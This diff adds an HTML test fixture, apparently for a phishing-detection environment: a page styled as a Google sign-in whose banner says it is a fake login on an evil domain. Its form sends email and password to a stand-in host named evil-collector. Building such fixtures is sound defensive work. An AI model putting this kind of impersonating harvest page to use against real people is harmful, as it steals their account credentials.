@@ -1,0 +1,119 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Sign in - Google Accounts</title>
+    <style>
+      body {
+        font-family: "Google Sans", Roboto, Arial, sans-serif;
+        max-width: 440px;
+        margin: 80px auto;
+        padding: 0 16px;
+        background: #f0f4f9;
+        color: #202124;
+      }
+
+      .card {
+        background: white;
+        border-radius: 28px;
+        padding: 48px 40px 36px;
+        box-shadow: 0 1px 3px rgba(0, 0, 0, 0.12);
+      }
+
+      .logo {
+        text-align: center;
+        margin-bottom: 16px;
+      }
+
+      .logo img {
+        height: 24px;
+      }
+
+      h1 {
+        text-align: center;
+        font-size: 24px;
+        font-weight: 400;
+        margin: 0 0 8px;
+      }
+
+      .subtitle {
+        text-align: center;
+        font-size: 16px;
+        color: #5f6368;
+        margin-bottom: 32px;
+      }
+
+      form {
+        display: grid;
+        gap: 16px;
+      }
+
+      label {
+        display: block;
+        font-size: 12px;
+        color: #5f6368;
+        margin-bottom: 4px;
+      }
+
+      input {
+        font: inherit;
+        width: 100%;
+        padding: 12px 16px;
+        border: 1px solid #dadce0;
+        border-radius: 4px;
+        box-sizing: border-box;
+      }
+
+      button {
+        font: inherit;
+        background: #1a73e8;
+        color: white;
+        border: none;
+        padding: 12px 24px;
+        border-radius: 4px;
+        cursor: pointer;
+        font-weight: 500;
+      }
+
+      .note {
+        background: #fff3cd;
+        border: 1px solid #ffc107;
+        border-radius: 8px;
+        padding: 12px;
+        margin-bottom: 16px;
+        font-size: 13px;
+        color: #664d03;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="note">
+      <strong>Gym fixture:</strong> Fake Google login on an evil domain.
+      Content fingerprinting should detect the brand mismatch.
+    </div>
+
+    <div class="card">
+      <div class="logo">
+        <img alt="Google" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='74' height='24'%3E%3Ctext y='20' font-size='20' font-family='Arial'%3EGoogle%3C/text%3E%3C/svg%3E" />
+      </div>
+
+      <h1>Sign in</h1>
+      <p class="subtitle">Use your Google Account</p>
+
+      <form action="https://evil-collector.example.invalid/harvest" method="post">
+        <div>
+          <label for="email">Email or phone</label>
+          <input id="email" name="email" type="email" value="victim@gmail.com" />
+        </div>
+
+        <div>
+          <label for="password">Password</label>
+          <input id="password" name="password" type="password" autocomplete="current-password" value="hunter2" />
+        </div>
+
+        <button type="submit">Next</button>
+      </form>
+    </div>
+  </body>
+</html>
